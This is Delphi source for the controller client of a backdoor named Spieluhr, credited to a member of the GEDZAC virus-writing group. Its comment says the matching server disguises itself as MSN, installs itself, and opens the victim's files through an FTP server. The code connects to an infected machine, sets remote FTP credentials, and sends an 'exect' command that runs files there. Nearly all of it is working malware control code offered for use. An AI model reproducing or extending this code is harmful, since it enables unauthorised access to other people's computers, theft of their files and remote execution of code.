unit Unit1;
{
 Backdoor.Spieluhr

 Este backdoor foi totalmente feito por Hutley/GEDZAC.
 Projeto terminado as 12:03 - 24/Dez/2005
 -
 A idéia foi criar um backdoor que permitisse o
 acesso aos arquivos do usuário infectado.
 Isso pode ser feito por meio de um servidor FTP
 contido no programa serrvidor. Que se disfarça de MSN
 para poder se auto instalar na máquina.
 -
 Dúvida, Bugs ou Sugestões:
 www.Hutley.cjb.net
}

interface

uses
 Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
 Dialogs, Buttons, StdCtrls, ComCtrls, ShellAPI, ScktComp;

type
 TForm1 = class(TForm)
  btnClose: TSpeedButton;
  GroupBox1: TGroupBox;
  Label1: TLabel;
  edtFTPUsername: TEdit;
  Label2: TLabel;
  edtFTPPassword: TEdit;
  Label3: TLabel;
  edtFTPPort: TEdit;
  GroupBox2: TGroupBox;
  Label4: TLabel;
  edtFile: TEdit;
  btnApply: TSpeedButton;
  StatusBar1: TStatusBar;
  GroupBox3: TGroupBox;
  edtIP: TEdit;
  Label5: TLabel;
  Label6: TLabel;
  edtPort: TEdit;
  btnConnect: TSpeedButton;
  btnExecute: TSpeedButton;
  lblLink: TLabel;
  clSocket: TClientSocket;
  btnAbout: TSpeedButton;
  procedure btnCloseClick(Sender: TObject);
  procedure lblLinkMouseEnter(Sender: TObject);
  procedure lblLinkMouseLeave(Sender: TObject);
  procedure lblLinkClick(Sender: TObject);
  procedure btnConnectClick(Sender: TObject);
  procedure btnApplyClick(Sender: TObject);
  procedure clSocketConnecting(Sender: TObject;
   Socket: TCustomWinSocket);
  procedure clSocketConnect(Sender: TObject; Socket: TCustomWinSocket);
  procedure clSocketDisconnect(Sender: TObject;
   Socket: TCustomWinSocket);
  procedure clSocketError(Sender: TObject; Socket: TCustomWinSocket;
   ErrorEvent: TErrorEvent; var ErrorCode: Integer);
  procedure btnExecuteClick(Sender: TObject);
  procedure btnAboutClick(Sender: TObject);
 private
    { Private declarations }
 public
    { Public declarations }
 end;
 
var
 Form1: TForm1;
 
const
 info: string = 'Win32.Backdoor.Spieluhr.Client';
 autor: string = 'Hutley / GEDZAC';
 
implementation

{$R *.dfm}

procedure TForm1.btnCloseClick(Sender: TObject);
begin
 close;
end;

procedure TForm1.lblLinkMouseEnter(Sender: TObject);
begin
 lblLink.Font.Style := [fsUnderline];
end;

procedure TForm1.lblLinkMouseLeave(Sender: TObject);
begin
 lblLink.Font.Style := [];
end;

procedure TForm1.lblLinkClick(Sender: TObject);
begin
 ShellExecute(GetDesktopWindow, 'open', 'http://Hutley.cjb.net', nil, nil, 0);
end;

procedure TForm1.btnConnectClick(Sender: TObject);
begin
 clSocket.Address := edtip.Text;
 clSocket.Port := StrToInt(edtPort.text);
 clSocket.Open;
end;

procedure TForm1.btnApplyClick(Sender: TObject);
begin
 if clSocket.Active then
 begin
  clSocket.Socket.SendText('nlogi' + edtFTPUsername.Text);
  clSocket.Socket.SendText('nPass' + edtFTPPassword.Text);
  clSocket.Socket.SendText('nport' + edtFTPPort.Text);
 end else Application.MessageBox('NOT CONNECTED', 'Error!', mb_IconError + mb_Ok);
end;

procedure TForm1.clSocketConnecting(Sender: TObject;
 Socket: TCustomWinSocket);
begin
 Statusbar1.Panels[0].Text := '*** Connecting. . .';
end;

procedure TForm1.clSocketConnect(Sender: TObject;
 Socket: TCustomWinSocket);
begin
 Statusbar1.Panels[0].Text := '*** CONNECTED';
end;

procedure TForm1.clSocketDisconnect(Sender: TObject;
 Socket: TCustomWinSocket);
begin
 Statusbar1.Panels[0].Text := '*** Disconnected';
end;

procedure TForm1.clSocketError(Sender: TObject; Socket: TCustomWinSocket;
 ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
 ErrorCode := 0;
 Statusbar1.Panels[0].Text := '*** Error';
end;

procedure TForm1.btnExecuteClick(Sender: TObject);
begin
 if edtFile.Text <> '' then
  if clSocket.Active then
   clSocket.Socket.SendText('exect' + edtFile.Text)
  else Application.MessageBox('NOT CONNECTED', 'Error!', mb_IconError + mb_Ok);
end;

procedure TForm1.btnAboutClick(Sender: TObject);
begin
 Application.MessageBox('Uh!' + #13 +
  'This backdoor was made by Hutley' + #13 +
  'Member of GEDZAC Virii Group.' + #13#13 +
  'If you want contact me in:' + #13 +
  'hutleyvx@gmail.com' + #13#13 +
  'Thats all folks!' + #13#13 +
  '! Brazil Rulez !', 'Backdoor.Spieluhr v1.0', mb_IconInformation + mb_ok);
end;

end.

 